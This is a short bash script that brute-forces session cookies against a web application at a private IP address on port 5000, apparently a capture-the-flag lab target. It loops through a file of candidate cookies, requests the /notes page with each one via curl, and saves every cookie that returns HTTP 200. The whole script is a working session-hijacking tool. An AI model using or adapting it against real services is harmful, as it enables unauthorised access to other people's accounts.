#!/bin/bash
echo "USAGE: cookies_bruteforce <cookies list file> <output file>"
echo "starting bruteforce"


while read line; do
    curl_result=$(curl -I -i -s -k -X  'GET' -H 'Host: 10.10.11.160:5000' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://10.10.11.160:5000/dashboard' -H 'Connection: close' -H 'Upgrade-Insecure-Requests: 1' -H  'Cache-Control: max-age=0' -b  'session='$line 'http://10.10.11.160:5000/notes' | head -n 1 | cut -d ' ' -f2)
    echo "cookie:" $line "curl_res="$curl_result
    if [[ $curl_result = "200" ]]; then
        echo $line >> $2
    fi
done < $1